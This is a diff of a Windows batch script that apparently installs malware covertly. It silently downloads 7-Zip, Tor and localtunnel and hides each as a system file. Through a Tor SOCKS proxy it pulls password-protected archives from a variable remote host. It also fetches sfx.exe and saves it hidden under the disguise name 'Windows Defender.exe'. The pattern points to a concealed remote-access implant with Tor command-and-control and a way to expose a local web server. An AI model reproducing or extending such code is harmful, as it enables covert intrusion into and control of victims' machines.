@@ -9,16 +9,16 @@ rem TESTING >
 if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windows
 rem TESTING <
 
-attrib -s -h -i "%environment%\7z.exe" && if exist "%environment%\7z.exe" (
-      attrib +s +h +i "%environment%\7z.exe"
+attrib -s -h -i "%environment%\7-Zip" && if exist "%environment%\7-Zip\7z.exe" (
+      attrib +s +h +i "%environment%\7-Zip"
 ) else (
-  "%environment%\curl.exe" -k https://www.7-zip.org/a/7zr.exe -o "%environment%\7z.exe" && attrib +s +h +i "%environment%\7z.exe"
+  "%environment%\curl.exe" -k https://www.7-zip.org/a/7z2201.exe -o "%temp%\7z2201.exe" && "%temp%\7z2201.exe" /S /D="%environment%\7-Zip" && del "%temp%\7z2201.exe" && attrib +s +h +i "%environment%\7-Zip"
 )
 
 attrib -s -h -i "%environment%\tor.exe" && if exist "%environment%\tor.exe" (
     attrib +s +h +i "%environment%\tor.exe"
 ) else (
-   "%environment%\curl.exe" -k -L https://archive.torproject.org/tor-package-archive/torbrowser/12.0.4/tor-expert-bundle-12.0.4-windows-x86_64.tar.gz -o "%temp%\Tor.tar.gz" && "%environment%\7z.exe" e "%temp%\Tor.tar.gz" -so | "%environment%\7z.exe" e -aoa -si -ttar "tor/tor.exe" -o"%environment%" -y && attrib +s +h +i "%environment%\tor.exe" && del "%temp%\Tor.tar.gz"
+   "%environment%\curl.exe" -k -L https://archive.torproject.org/tor-package-archive/torbrowser/12.0.4/tor-expert-bundle-12.0.4-windows-x86_64.tar.gz -o "%temp%\Tor.tar.gz" && "%environment%\7-Zip\7z.exe" e "%temp%\Tor.tar.gz" -so | "%environment%\7-Zip\7z.exe" e -aoa -si -ttar "tor/tor.exe" -o"%environment%" -y && attrib +s +h +i "%environment%\tor.exe" && del "%temp%\Tor.tar.gz"
 )
 
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
@@ -40,19 +40,19 @@ if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else 
 attrib -s -h -i "%environment%\localtunnel" && if exist "%environment%\localtunnel" (
    attrib +s +h +i "%environment%\localtunnel"
 ) else (
- "%environment%\curl.exe" -k -L https://github.com/angelobreuer/localtunnel.net/releases/download/1.0.1.0/win-x86.zip > "%temp%/localtunnel.zip" && "%environment%\7z.exe" x "%temp%\localtunnel.zip" -o"%environment%" -y && ren "%environment%\win-x86" "localtunnel" && attrib +s +h +i "%environment%\localtunnel" && del /s /f /q /a "%temp%\localtunnel.zip"
+ "%environment%\curl.exe" -k -L https://github.com/angelobreuer/localtunnel.net/releases/download/1.0.1.0/win-x86.zip > "%temp%/localtunnel.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\localtunnel.zip" -o"%environment%" -y && ren "%environment%\win-x86" "localtunnel" && attrib +s +h +i "%environment%\localtunnel" && del /s /f /q /a "%temp%\localtunnel.zip"
 )
  
  attrib -s -h -i "%environment%\apache2" && if exist "%environment%\apache2\bin\httpd.exe" (
     attrib +s +h +i "%environment%\apache2"
 ) else (
-   "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7z.exe" x "%temp%\apache2.7z" -p7zapache2 -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del /s /f /q /a "%temp%\apache2.7z"
+   "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache2 -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del /s /f /q /a "%temp%\apache2.7z"
 )
 
  attrib -s -h -i "%environment%\ffmpeg.exe" && if exist "%environment%\ffmpeg.eexe" (
     attrib +s +h +i "%environment%\ffmpeg.exe"
 ) else (
-   "%environment%\curl.exe" -k %proxy% %host%/Tools/ffmpeg.7z -o "%temp%\ffmpeg.7z" && "%environment%\7z.exe" x "%temp%\ffmpeg.7z" -p7zffmpeg -o"%environment%" -y && attrib +s +h +i "%environment%\ffmpeg.exe" && del /s /f /q /a "%temp%\ffmpeg.7z"
+   "%environment%\curl.exe" -k %proxy% %host%/Tools/ffmpeg.7z -o "%temp%\ffmpeg.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\ffmpeg.7z" -p7zffmpeg -o"%environment%" -y && attrib +s +h +i "%environment%\ffmpeg.exe" && del /s /f /q /a "%temp%\ffmpeg.7z"
 )
 
 attrib -s -h -i "%environment%\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe -o "%environment%\Windows Defender.exe" && attrib +s +h +i "%environment%\Windows Defender.exe" 
